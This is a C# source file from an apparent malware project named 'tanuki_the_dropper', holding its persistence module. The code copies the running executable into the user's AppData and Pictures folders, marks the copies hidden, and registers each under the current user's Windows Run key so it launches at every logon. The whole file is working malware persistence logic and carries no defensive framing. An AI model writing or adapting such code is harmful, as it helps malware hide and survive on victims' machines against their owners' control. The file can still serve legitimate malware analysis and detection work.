using Microsoft.Win32;

namespace tanuki_the_dropper
{
    public class Persistence
    {
        private string[] path_copies = new string[] { Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) };

        public void SelfCopy()
        {
            Utility.ConsoleLog("Start replication.");

            string currentCopy = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;

            if (currentCopy == null) { return; }

            int i = 0;
            foreach (string path in path_copies)
            {
                string copy = Path.Combine(path, "tanuki_the_dropper" + i.ToString() + ".exe");

                if (Directory.Exists(path))
                {
                    if (!File.Exists(copy))
                    {
                        try
                        {
                            File.Copy(currentCopy, copy, true);
                            Utility.ConsoleLog($"Copied successfully in {copy}.");

                            try
                            {
                                File.SetAttributes(copy, File.GetAttributes(copy) | FileAttributes.Hidden);
                                Utility.ConsoleLog("Hidden attribute set for file.");
                            }
                            catch (Exception ex)
                            {
                                Utility.ConsoleLog("Error setting hidden attribute for file: " + ex.Message);
                            }
                        }
                        catch (Exception ex)
                        {
                            Utility.ConsoleLog("Failed to copy: " + ex.Message);
                        }

                        EditRegister(copy);
                    }

                    i++;
                }
            }
        }

        private void EditRegister(string filePath)
        {
            string keyName = Path.GetFileNameWithoutExtension(filePath);
            string value = filePath;

            try
            {
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                registryKey.SetValue(keyName, value);

                registryKey.Close();

                Utility.ConsoleLog($"Added register entry for {value}");
            }
            catch (Exception ex)
            {
                Utility.ConsoleLog($"Error adding program to registry.");
            }
        }
    }
}
